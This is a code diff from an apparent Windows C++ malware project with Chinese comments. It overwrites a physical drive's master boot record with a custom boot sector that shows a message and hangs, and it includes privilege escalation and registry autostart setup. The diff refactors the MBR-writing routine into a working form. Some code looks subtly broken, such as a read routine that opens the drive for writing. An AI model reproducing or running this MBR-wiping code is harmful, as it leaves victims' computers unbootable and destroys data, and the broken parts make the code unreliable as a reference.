@@ -1,12 +1,15 @@
 #include"std.h"
 
-#include <TlHelp32.h>
 #include"type.h"
 
 using namespace std;
 //自定义MBR
-char pMBR[512] = { 0xB8,0x11,0x00,0xCD,0x10,0xBD,0x18,0x7C,0xB9,/*字符位数*/0x00,0x00,0xB8,0x01,0x13,0xBB,0x0C,0x00,0xBA,0x00,0x00,0xCD,0x10,0xEB,0xFE };
-const char* msgstr = "Unknown Error";
+#pragma warning(push)
+#pragma warning (disable:4309 4838)
+
+#pragma warning(pop)
+
+
 void GetPrivileges()
 {
 	//定义一个PLUID
@@ -26,31 +29,55 @@ void GetPrivileges()
 
 }
 
-//改MBR
-void ReadPHYSICALDRIVE(unsigned int id)
+//写MBR
+bool WritePhydriveMBR(unsigned int id,char *msgstr)
 {
-	//改MBR中字符位数
-	pMBR[9] = static_cast<BYTE>(strlen(msgstr));
-	//加循环逻辑锁
-	pMBR[0x1BF] = 0x00;
-	pMBR[0x1C2] = 0x05;
-	//加结尾
-	pMBR[510] = 0x55;
-	pMBR[511] = 0xAA;
-	//把提示字符写入MBR
-	strcpy_s(reinterpret_cast<char*>(pMBR + 24), 512, msgstr);
+	static char pMBR[512] = { 0xB8,0x11,0x00,0xCD,0x10,0xBD,0x18,0x7C,0xB9,/*字符位数*/0x00,0x00,0xB8,0x01,0x13,0xBB,0x0C,0x00,0xBA,0x00,0x00,0xCD,0x10,0xEB,0xFE };
+	static bool isfirstuse=true;
+	if (isfirstuse)
+	{
+		//改MBR中字符位数
+		pMBR[9] = static_cast<BYTE>(strlen(msgstr));
+		//加循环逻辑锁————已弃用！！！仅Win9x下有效果！！！
+		//pMBR[0x1BF] = 0x00;
+		//pMBR[0x1C2] = 0x05;
+		//加结尾
+		pMBR[510] = static_cast<char>(0x55);
+		pMBR[511] = static_cast<char>(0xAA);
+		//把提示字符写入MBR
+		strcpy_s(reinterpret_cast<char*>(pMBR + 24), 512, msgstr);
+	}
 
-	
+	//计算硬盘文件名称
 	TCHAR DriveName[32];
 	swprintf_s(DriveName,32,_T("\\\\.\\PHYSICALDRIVE%d"),id);
-	//
+	//打开
 	HANDLE hFile;
 	hFile = CreateFile(DriveName, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
 	//用readfile来读取MBR
-	WriteFile(hFile, pMBR, 512, NULL, NULL);
+	return WriteFile(hFile, pMBR, 512, NULL, NULL)==TRUE;
 
 }
 
+//读MBR
+wstring ReadPhydriveMBR(unsigned int id)
+{
+	
+	TCHAR DriveName[32],pMBR[512];
+	//计算硬盘文件名称
+	swprintf_s(DriveName, 32, _T("\\\\.\\PHYSICALDRIVE%d"), id);
+	//打开
+	HANDLE hFile;
+	hFile = CreateFile(DriveName, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+	//用readfile来读取MBR
+	DWORD dwReadSize;
+	
+	return (ReadFile(hFile, pMBR, 512, &dwReadSize, NULL) == TRUE ? static_cast<wstring>(pMBR) : static_cast<wstring>(_T("")));
+
+}
+
+
+//注册自启动
 void RegAutoStart()
 {
 	HKEY hKey;
